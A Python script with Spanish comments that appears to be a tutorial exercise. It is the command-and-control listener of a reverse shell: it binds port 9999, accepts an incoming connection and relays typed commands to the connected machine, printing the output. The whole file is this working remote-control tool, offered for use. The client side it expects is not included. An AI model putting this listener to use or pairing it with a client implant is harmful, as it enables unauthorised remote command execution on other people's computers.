import socket  #Permite conectar 2 ordenadores
import sys     #Comandos del system


#Create socket
def socket_create():
    try:
        global host
        global port             #Globales
        global s
        host = ''               #Se rellenara en un futuro
        port = 9999             #Poco conocido
        s = socket.socket()     #Crea la variable del socket

    except socket.error as msg:
        print('Socket creation error:' + str(msg))


#Vincular el socket al puerto y esperar la conexión del cliente
def socket_bind():
    try:
        global host
        global port             #Globales
        global s
        print('Binding socket to port: ' + str(port))
        s.bind((host, port))    #
        s.listen(5)             #En escucha max 5 connections  ESENCIAL

    except socket.error as msg:
        print('Socket binding error:' + str(msg) + '\n' + 'Retrying...')
        socket_bind()

#Establecer la conexion con el cliente
def socket_accept():
    conn, address = s.accept()
    print('connection has been established | ' + 'IP ' + address[0] + ' | Port ' + str(address[1]))
    send_commands(conn)
    conn.close()

#Controlar el cliente
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:  #Cuando se usa el comando pasa a bytes | Solo envia si tiene algo escrito
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()